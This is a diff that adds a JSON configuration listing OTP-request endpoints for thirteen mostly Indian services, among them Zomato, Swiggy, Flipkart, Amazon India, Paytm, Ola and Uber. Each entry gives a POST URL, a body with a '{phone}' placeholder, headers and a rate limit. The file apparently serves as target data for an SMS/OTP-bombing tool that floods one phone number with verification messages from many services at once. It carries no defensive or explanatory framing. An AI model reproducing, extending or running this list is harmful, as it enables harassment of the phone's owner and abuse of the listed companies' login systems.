@@ -1,0 +1,108 @@
+{
+  "endpoints": [
+    {
+      "name": "zomato",
+      "url": "https://www.zomato.com/php/authenticate",
+      "method": "POST",
+      "payload": {"mobile": "{phone}", "csrf": ""},
+      "headers": {"X-Requested-With": "XMLHttpRequest"},
+      "rate_limit": 5
+    },
+    {
+      "name": "swiggy",
+      "url": "https://www.swiggy.com/mobile/otp",
+      "method": "POST",
+      "payload": {"mobile": "{phone}"},
+      "headers": {"User-Agent": "Swiggy/3.0.0"},
+      "rate_limit": 3
+    },
+    {
+      "name": "flipkart",
+      "url": "https://www.flipkart.com/api/3/user/otp/send",
+      "method": "POST",
+      "payload": {"loginId": "{phone}", "type": "MOBILE"},
+      "headers": {},
+      "rate_limit": 4
+    },
+    {
+      "name": "amazon_in",
+      "url": "https://www.amazon.in/ap/requestotp",
+      "method": "POST",
+      "payload": {"mobileNumber": "{phone}", "appAction": "LOGIN"},
+      "headers": {"Content-Type": "application/json"},
+      "rate_limit": 3
+    },
+    {
+      "name": "paytm",
+      "url": "https://secure.paytm.com/v1/user/requestOtp",
+      "method": "POST",
+      "payload": {"mobileNumber": "{phone}"},
+      "headers": {"x-platform": "web"},
+      "rate_limit": 2
+    },
+    {
+      "name": "grofers",
+      "url": "https://grofers.com/api/v1/user/request_otp",
+      "method": "POST",
+      "payload": {"mobile": "{phone}"},
+      "headers": {},
+      "rate_limit": 5
+    },
+    {
+      "name": "bigbasket",
+      "url": "https://www.bigbasket.com/mobile/send_otp/",
+      "method": "POST",
+      "payload": {"mobile": "{phone}"},
+      "headers": {"X-CSRFToken": "null"},
+      "rate_limit": 4
+    },
+    {
+      "name": "zepto",
+      "url": "https://www.zepto.com/api/v1/auth/otp",
+      "method": "POST",
+      "payload": {"mobile": "{phone}"},
+      "headers": {},
+      "rate_limit": 3
+    },
+    {
+      "name": "blinkit",
+      "url": "https://blinkit.com/api/v2/auth/send_otp",
+      "method": "POST",
+      "payload": {"phone": "{phone}"},
+      "headers": {},
+      "rate_limit": 3
+    },
+    {
+      "name": "dunzo",
+      "url": "https://api.dunzo.com/v2/user/request_otp/",
+      "method": "POST",
+      "payload": {"mobile": "{phone}"},
+      "headers": {},
+      "rate_limit": 4
+    },
+    {
+      "name": "rapido",
+      "url": "https://api.rapido.bike/api/v3/user/request_otp",
+      "method": "POST",
+      "payload": {"mobile": "{phone}"},
+      "headers": {},
+      "rate_limit": 3
+    },
+    {
+      "name": "ola",
+      "url": "https://book.ola.com/otp/send",
+      "method": "POST",
+      "payload": {"mobile": "{phone}"},
+      "headers": {},
+      "rate_limit": 3
+    },
+    {
+      "name": "uber",
+      "url": "https://login.uber.com/api/v1/session/otp",
+      "method": "POST",
+      "payload": {"mobile": "{phone}"},
+      "headers": {},
+      "rate_limit": 2
+    }
+  ]
+}
